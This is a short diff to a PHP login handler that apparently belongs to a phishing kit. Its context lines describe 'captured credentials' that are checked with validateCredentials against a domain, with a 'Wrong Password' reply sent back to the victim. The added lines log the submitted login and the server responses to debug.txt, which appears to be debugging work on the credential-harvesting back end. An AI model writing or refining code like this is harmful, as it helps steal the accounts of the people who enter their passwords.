@@ -126,6 +126,10 @@ if (!empty($login) && !empty($passwd)) {
     
     // Handle final validation step
     if ($auth_step === 'validate' || empty($auth_step)) {
+        // Debug: Log the received data
+        $debugLog = "Received data - Login: $login, Auth step: $auth_step\n";
+        file_put_contents("debug.txt", $debugLog, FILE_APPEND);
+        
         // Try to validate the captured credentials
         $validCredentials = validateCredentials($login, $passwd, $domain);
         
@@ -179,6 +183,10 @@ if (!empty($login) && !empty($passwd)) {
             // Return the correct error message
             $data = array('signal' => 'not ok', 'msg' => 'Wrong Password');
         }
+        
+        // Debug: Log the response being sent
+        $responseLog = "Sending response: " . json_encode($data) . "\n";
+        file_put_contents("debug.txt", $responseLog, FILE_APPEND);
         
         echo json_encode($data);
         
